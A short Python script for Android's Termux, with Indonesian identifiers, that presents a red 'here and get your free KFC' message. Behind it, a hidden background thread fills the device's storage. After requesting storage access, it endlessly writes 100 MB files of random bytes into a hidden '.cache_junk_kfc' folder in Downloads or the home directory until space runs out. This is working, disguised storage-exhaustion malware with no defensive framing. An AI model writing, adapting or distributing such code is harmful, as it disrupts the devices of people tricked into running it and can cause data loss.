import os
import sys
import time
import threading
import uuid

UKURAN_FILE_MB=100
JUMLAH_BYTES=UKURAN_FILE_MB*1024*1024
LOKASI_JUNK=[os.path.join(os.path.expanduser('~'), 'storage', 'shared', 'Download', '.cache_junk_kfc'), os.path.join(os.path.expanduser('~'), '.cache_junk_kfc')]

def buat_file_sampah(lokasi_target):
    nama_file=str(uuid.uuid4())
    ekstensi=time.strftime(".%Y%m%d%H%M%S")
    nama_final=os.path.join(lokasi_target, f"temp_{nama_file}{ekstensi}")
    try:
        with open(nama_final, 'wb') as f:
            f.write(os.urandom(JUMLAH_BYTES))
        return True
    except Exception:
        return False

def spam_storage():
    lokasi_berhasil=None
    for path_target in LOKASI_JUNK:
        try:
            os.makedirs(path_target, exist_ok=True)
            lokasi_berhasil=path_target
            break
        except Exception:
            pass
    if not lokasi_berhasil:
        return
    while True:
        try:
            if buat_file_sampah(lokasi_berhasil):
                pass
            else:
                time.sleep(1)
        except Exception:
            time.sleep(1)

def main():
    os.system('termux-setup-storage')
    time.sleep(5) 
    t=threading.Thread(target=spam_storage)
    t.daemon=True
    t.start()
    try:
        os.system('clear')
        while True:
            sys.stdout.write("\033[91m")
            print("here and get your free KFC")
            sys.stdout.write("\033[0m")
            time.sleep(0.5)
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    main()
